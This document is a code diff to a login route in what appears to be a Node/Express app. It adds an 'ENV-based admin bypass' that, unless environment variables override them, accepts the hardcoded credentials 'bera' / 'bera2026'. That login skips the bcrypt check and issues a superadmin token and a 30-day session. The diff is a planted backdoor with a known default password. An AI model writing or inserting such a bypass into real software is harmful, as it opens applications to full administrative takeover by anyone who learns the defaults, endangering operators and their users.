@@ -93,6 +93,39 @@ router.post("/auth/login", async (req, res): Promise<void> => {
     return;
   }
 
+  // ── ENV-based admin bypass (no database, no bcrypt) ─────────────────────────
+  // Credentials: set ADMIN_USERNAME / ADMIN_PASSWORD env vars to override defaults
+  const envUser = process.env.ADMIN_USERNAME ?? "bera";
+  const envPass = process.env.ADMIN_PASSWORD ?? "bera2026";
+  if (username === envUser && password === envPass) {
+    // Find or use the superadmin DB record so the rest of the app works normally
+    const [adminRecord] = await db
+      .select()
+      .from(usersTable)
+      .where(eq(usersTable.role, "superadmin"))
+      .limit(1);
+
+    if (adminRecord) {
+      await db.update(usersTable).set({
+        lastLogin: new Date(),
+        loginCount: (adminRecord.loginCount || 0) + 1,
+      }).where(eq(usersTable.id, adminRecord.id));
+
+      const token = signToken({ id: adminRecord.id, username: adminRecord.username, role: "superadmin" });
+      const refreshToken = uuidv4();
+      await db.insert(sessionsTable).values({
+        userId: adminRecord.id,
+        refreshToken,
+        ipAddress: req.ip,
+        userAgent: req.headers["user-agent"],
+        expiresAt: new Date(Date.now() + 30 * 24 * 60 * 60 * 1000),
+      });
+      res.json({ token, refreshToken, user: toUserDto({ ...adminRecord, role: "superadmin" }) });
+      return;
+    }
+  }
+  // ── End env-based admin bypass ────────────────────────────────────────────────
+
   const [user] = await db.select().from(usersTable).where(eq(usersTable.username, username)).limit(1);
   if (!user || !(await bcrypt.compare(password, user.password))) {
     res.status(401).json({ error: "Invalid credentials" });
